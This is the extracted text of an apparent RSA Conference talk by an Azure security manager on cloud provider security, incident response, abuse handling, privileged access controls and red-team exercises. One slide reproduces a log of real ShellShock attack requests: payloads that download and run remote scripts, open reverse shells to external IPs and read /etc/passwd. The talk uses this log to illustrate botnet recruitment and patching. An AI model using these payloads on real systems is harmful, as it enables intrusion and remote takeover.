SESSION ID: CDS-F02
Assume Breach: An Inside Look at Cloud Service Provider Security

David B. Cross
General Manager, Azure Security Microsoft
@DavidCross_MS

#RSAC

#RSAC
Microsoft Cloud Security Overview

Protect

Security Development Lifecycle & Operational Security Assurance Network and Identity Isolation Least Privilege / Just-in-Time (JIT) Access Vulnerability / Update Management

Detect

Auditing and Certification Live Site Penetration Testing Centralized Logging and Monitoring Fraud and Abuse Detection

Respond

Breach Containment Coordinated Security Response Customer Notification

#RSAC
Clouds Are Appealing to Adversaries
 Easily available free trials  Anonymity  Tons of compute power  Limitless storage  IP blocks rich with Internet-exposed services  Concentration of vulnerable assets  High bi-directional bandwidth

#RSAC
Cloud Security is a Shared Responsibility
 Azure:
 Perform BigData analysis for intrusion detection of Azure infrastructure  Manage monitoring and alerting of security events of the platform  Employ denial of service attack mitigations and detections  Respond to fraud/abuse and sends Azure security notifications
 Customers:
 Configure security of their subscription and applications  Security monitoring on their Virtual Machines, Roles, Website, etc.  Can add extra layers of deploying Azure provided security controls  Respond to alerts from tenant security monitoring and Azure Security notifications

#RSAC
Let me share a few internal stories...

A Day in the Life of an

#RSAC

Incident Responder

#RSAC
Azure Security Incident Response
 Goal is to protect, defend and respond to our customer needs  Let's look at some illustrative examples
 These are not hypothetical or foreshadowing  These are real incidents that have occurred this year (names redacted
and changed of course)

#RSAC
Compromised VMs: An Example
The Internet
Note: although we do not monitor customer VMs and applications without their permission, we do automatically monitor the overall traffic, unusual spikes in activity and suspicious connections

#RSAC
Customer Response
 We notified the customer of potential compromise
 They were happy we alerted them  They immediately analyzed their logs, both on the VM and in Azure
Storage:
 They noticed that the A/V in their VMs had been turned off

#RSAC
Azure Logging
 And event logs showed some...unusual...activity a few days prior:

#RSAC
Azure Logging
 The customer had not been regularly looking at the logs
 Or pulling them into the on-premise SIEM they normally use...  Alerts and activity were clear and breach activity would have been
immediately detected!
 Lesson: It requires both Azure and the customers monitor the assets in the cloud end-to-end
 It is not a strict wall between the two responsibilities

#RSAC
Another Example: ShellShock

ActivityTime Request 9/25/2014 6:54 ()+{+:;};+/bin/bash+-c+"wget+http://fake.itv247.net/bash/index.php" 9/25/2014 9:26 ()+{+:;};+/bin/bash+-c+"wget+http://19vision.com/19.php+-O+/tmp/tmp1238129282"
9/25/2014 10:24 ()+{+:;};+/bin/bash+-c+"curl+http://laravel.pw/a.php" 9/25/2014 12:09 ()+{+:;};+/bin/sh+-i+>;AMP;+/dev/tcp/101.5.211.158/8080+0>;AMP;1 9/25/2014 12:34 ()+{+:;};+/bin/cat+/etc/passwd 9/25/2014 13:03 ()+{+:;};+/bin/bash+-c+"wget+http://psicologoweb.net/mc/s.php" 9/25/2014 14:13 ()+{+:;};+/bin/bash+-c+"telnet+namesense.com+7700" 9/25/2014 15:31 ()+{+:;};+/bin/bash+-c+"wget+http://91.207.254.60/.../bash.php?pass=/cgi-sys/defaultwebpage.cgi" 9/25/2014 18:48 ()+{+:;};+/bin/cat+/tmp/1 9/25/2014 19:05 ()+{+:;};+/bin/bash+-c+"ls" 9/25/2014 23:16 ()+{+:;};+/bin/bash+-i+>;AMP;+/dev/tcp/188.165.234.95/445+0>;AMP;1
9/26/2014 3:45 ()+{+:;};+/bin/bash+-c+"wget+-O+/var/tmp/wow1+208.118.61.44/wow1;perl+/var/tmp/wow1;rm+-rf+/var/tmp/wow1" 9/26/2014 4:25 User-Agent:+()+{+:;};+/bin/bash+-c+"wget+http://psicologoweb.net/mc/s.php/11st.co.kr" 9/26/2014 5:44 ()+{+:;};+/bin/bash+-c+'/bin/bash+-i+>;AMP;+/dev/tcp/195.225.34.101/3333+0>;AMP;1' 9/26/2014 7:04 User-Agent:+()+{+:;};+sudo+yum+update+bash 9/26/2014 7:05 ()+{+:;};+/bin/bash+-c+"wget+--delete-after+http://stelradradiators.ru/_files/File/test.php" 9/26/2014 10:16 ()+{+:;};+/bin/bash+-c+"wget+--delete-after+http://remika.ru/userfiles/file/test.php" 10/2/2014 1:24 ()+{+:;};+/bin/bash+-c+"wget+ellrich.com/legend.txt+-O+/tmp/.apache;killall+-9+perl;perl+/tmp/.apache;rm+-rf+/tmp/.apache"

 Botnet Building 101
 9/24: ShellShock Disclosed
 Attacks begin almost immediately
 IaaS (Linux) VMs Attacked become zombies

 Lesson: stay current for all critical security patches!

#RSAC
Tenant-level Breach Notification
 Notification provided to tenant admins
 Require tenant response / remediation
 48 hour notice > Immediate Deployment Suspension > Disable Subscription

#RSAC
Top Risks Resulting in Tenant Breach

Risk Internet Exposed RDP or SSH Endpoints
Virtual Machine Missing Security Patches
Web Application Vulnerability
Weak Admin/Co-Admin Credentials Unrestricted SQL Endpoint Storage Key Disclosure Insufficient Security Monitoring

Mitigation Network ACLs or Host-based Firewall; Strong passwords; VPN or SSH Tunnels
Keep Automatic Updates Enabled
Securing Azure Web Applications; Vulnerability scan/penetration test
Azure Multi-Factor Authentication; Subscription Management Certificate Azure SQL Firewall Manage Access to Storage Resources Azure Security and Log Management

How we Protect the

#RSAC

Infrastructure

#RSAC
Responding to Incidents
 Example: the FTP Bug timeline
 Background of Incident:
 Data uploaded to Azure Websites through FTP was accessible to other customers
 Potential data disclosure impacting < 20 customers

#RSAC
Our Internal Tracking Process

 Heartbleed  OpenSSL Privilege Escalation  Broad media attention  Azure Infrastructure: < 24 hours to declare all clear  Scanned public Azure and notified vulnerable customers
 ShellShock  Bash Privilege Escalation  Less publicity than Heartbleed yet higher risk  Azure Infrastructure: 2 hours to declare "all clear"  Scanned public Azure and notified vulnerable customers
 MS14-066  Windows Schannel Privilege Escalation  Began roll out of updated of updated images within 6mins of patch release  Notified impacted customers via Azure Security Advisory

Azure
Azure Active Directory Quick Create Gallery

Service/Feature/Device Cloud Services (Web and Worker Role)
Virtual Machines (IaaS) Windows

Investigation Complete 


Uses OpenSSL
No
No

Vulnerable No No

Virtual Machines (IaaS) Linux



Windows Azure Traffic Manager (WATM)



Virtual Networking



Yes

Yes

No

No

No

No

Storage (Tables, Blobs, Queues)



No

No

Web sites



Yes

No

Mobile Services



Yes

No

Service Bus



No

No

Tasks



No

No

Workflow



No

No

CDN



Yes

No

StorSimple



Yes

No

Microsoft Online Directory Service



No

No

Organizational Identity



No

No

Access Control Service



No

No

Rights Management Service



No

No

Identity Access Management



No

No

Multi-factor Authentication



Yes

No

Ubuntu (all versions)



Yes

No

OpenSuse



Yes

No

CentOS



Yes

No

Puppet Server



Yes

No

Chef



Yes

No

Oracle SQL VM



Yes

No

Windows (all flavors)



No

No

Heartbleed Status Tracking

#RSAC
Network Attack Protection: Cloud vs. Cloud

 35M packets per second of attack traffic
 Azure OneDDoS drops < 90% of DoS traffic at Edge
 The cause....cloud vs. cloud

Cloud Provider A

Cloud Provider B

Cloud Provider C

#RSAC
Managing Abuse

#RSAC
Growth of Abuse Cases Over Time

AZURE ABUSE CASES 2H2014

Series1

800 702

700

618

578

600

480 500

400

306

300

242

200

100

0

1

2

3

4

5

6

Types of Abuse · SPAM · Phishing · DoS · Hacking · Copyright Infringement · Illegal Activities ·...
Report Abuse at: https://cert.microsoft.com

#RSAC
Abuse Incident
 Customer received this notification from Azure incident response team:

#RSAC
In Depth Analysis of Abuse Attacks
 The customer (Linux) VMs had been compromised  They actually did monitor all their logs
 But they did not received any alerts  Azure detected attacker due compromise VMs used to attack others ­
e.g. DoS
 What happened?
 They asked Microsoft Support for help...  Deeper analysis of many VMs was necessary

#RSAC
Azure Security: Forensic Analysis
 In Azure, we can perform detailed large-scale forensics analysis of VMs
 This is an emerging area that is currently in private preview with select customers
 We do this for trial VMs that have been shutdown for fraud, abuse and other bad behavior to collect/detect such indicators
 We don't execute this on customer assets without their consent  Would be intrusion and violation of our data privacy agreement

#RSAC
Performing Forensic Analysis
 But when you need assistance in a large-scale breach, and with your permission...
 We can perform detailed analysis
 What did we find?
 There was a zero-day attack on a Linux-based application  That was not known in the industry yet...and never seen in the wild
 Yes, we analyze Linux and not just Windows!

#RSAC
Cloud Scale Forensics
 Scale from 100's-1000's of cores as needed  Deployed around the world  ~45K VMs Analyzed Weekly  15+ PBs of collected artifacts  >100K VMs analyzed during single investigation

Infrastructure Access

#RSAC

Control and Management

#RSAC
Restricted Access Workflow in Azure

TFS Authentication
Attribution Authorization
Access Audit

· Incident/Support Request Filed · Credentials collected and 2FA submitted · Collecting group membership and claims · Evaluating claims against policies · Access decision enforced · All actions are logged to Azure storage

#RSAC
Access Control: JiT/JEA/RBAC
 No standing access to any user/administrator  Our JiT system grants least privilege required to complete tasks  Everything structured using RBAC and Azure Active Directory

#RSAC
2FA Required to Even Request Access
 All steps logged independently  Security analytics system monitors access JiT/RBAC requests
 Alerts when workflows do not correlate with TFS/requests  When an admin subverts the process, a Sev 1 incident occurs

#RSAC
Building A Trusted Access Chain
- It doesn't matter how many "jumps" you go through - If an admin can jump through the steps, a bad guy can follow the
same path - The source computer, and all others in the chain has to be secure
or the chain is compromised

#RSAC
Online Services Administration Console

 You don't want this:

Browsers/Plugins

IE

Flash

Firefox

Chrome

...

...

Third Party/Open Source Tools

PDF Reader

Notepad+ +

PowerGui

....

...

...

MS Tools

Visual Studio

Excel

Word

Outlook

PPT

...

Base OS
You want this!

Enforced (Secure) Admin Console

#RSAC

Secure Console

Least Privilege
Execution restriction

Active Scanning

Patching

Base OS

Network Hardening

Limited Functionality

Data Science and Machine

#RSAC

Learning

#RSAC
Why Machine Learning is Relevant to Defense

#RSAC
Post Detection Fraud Algorithm Learning
 Fraud: Theft of service; Use of service without intent to pay
 Example: Stolen payment instrument
 Fraud Storms
 Potential for Capacity Impact  Often lead to spike in Abuse
 ML-based detection
 Sign-up patterns  Compute Usage  Bandwidth Usage  etc.

#RSAC
Detecting Anomalies

#RSAC
Example: Phishing Attacks
 Azure Active Directory and Office 365, automatically detect when a user may have been compromised
 Company admins can configure alerts

#RSAC
Automatic Detection of Stolen Credentials
 Even though a user's password had been stolen...
 When the attacker tried to logon to Azure from (name your favorite country here...)
 Customers were alerted automatically!

Intrusion Detection in the Cloud

New external IP
IP: 65.52.120.233 Domain: popsectest.cloudapp.net Process: powershell.exe User: _spogmsvc3

This attacker is trying to avoid detection by using PowerShell. Think he'll succeed? Our network monitoring detects his exfiltration and command-and-control activity.
Our machine learning flags his session as unusual relative to previous behavior.

Large outbound data transfer
IP: 65.52.120.233:1337 Domain: popsectest.cloudapp.net Process: powershell.exe User: _spogmsvc3 Bytes: 11,000K
Beacon
IP: 65.52.120.233:1338 Domain: popsectest.cloudapp.net Process: svchost.exe User: SYSTEM Interval: 4
MCM: Abnormal activity pattern
Host: CH1YL1ADM004 User: _spogmsvc3 LogonID: 1043 Worst transition score: 100 Overall score: 59

#RSAC

#RSAC
Machine Learning: Data-Driven Offense
 Reduce likelihood of stealth operators  Decrease MTTC and MTTP  Leverages the cloud
 Storage and compute scalability
 Examples:
 Data-driven pivoting  Visualization  Identify pivoting

#RSAC
RED vs. BLUE

Internal Azure Security Red Teaming

Modeling real-world attacks

Identify gaps in security story

Demonstrable impact

 Model emerging threats & use blended threats
 Pivot laterally & penetrate deeper
 Exfiltrate & leverage compromised data
 Escape & Evade / Persistence

 Measures Time to Compromise (MTTC) / Pwnage (MTTP)
 Highlight security monitoring & recovery gaps
 Improves incident response tools & process

 Prove the need for Assume Breach
 Enumerate business risks
 Justify resources, priorities, & investment needs

#RSAC

Blue Teaming Detect and Respond

Exercises ability to detect & respond

Enhances situational awareness

Measures readiness & impact

 Detect attack & penetration (MTTD)
 Respond & recover to attack & penetration (MTTR)
 Practiced incident response

 Produces actionable intelligence
 Full visibility into actual conditions within environment
 Data analysis & forensics for attack & breach indicators

 Accurately assesses real-world attacks
 Identifies gaps & investment needs
 Focus on slowing down attackers & speeding recovery
 Hardening that prevents future attacks

#RSAC

We Conduct War Games

Exercise ability to respond
 Like a fire drill vs. a real fire  Standardized operating
procedures & improve response  Reduce Mean Time To
Detection (MTTD)  Reduce Mean Time To
Recovery (MTTR)
Procedures
 Attack scenario  Incident response process  Post-mortem

Example scenarios
 Service compromise  Inside attacker  Remote code execution  Malware outbreak  Customer data compromised  Denial of service

#RSAC

#RSAC
Example: Blue Team Catching the Red Team
1
1. Non-standard user access alert triggered ­ access didn't go through standard JIT or access approvals
2. Log of new user detection: nonstandard user name
2

#RSAC
Cloud Operations Summary
 We always assume breach  We continuously conduct war game and pen test exercises  Every issue or case is a source of learning and RCA  We continue to build detection and alerting automation  We use all learnings and best practices to help all tenants  We rely on the community to share any missed areas
https://aka.ms/bugbounty

#RSAC
Call To Action!

Safe DevOps Practices
Use Secure Consoles with whitelisted software and
no local admin privs

Auditing for Detection
Ensure logging is enabled and always monitor for attacks and anomalies

No Persistent
Admins
Always require MFA, JiT, RBAC

Infrastructure Hygiene
Timely VM and application patching and continuous
scanning of baselines

Protect Your Secrets
Periodic secret & credential rolling and
protected storage

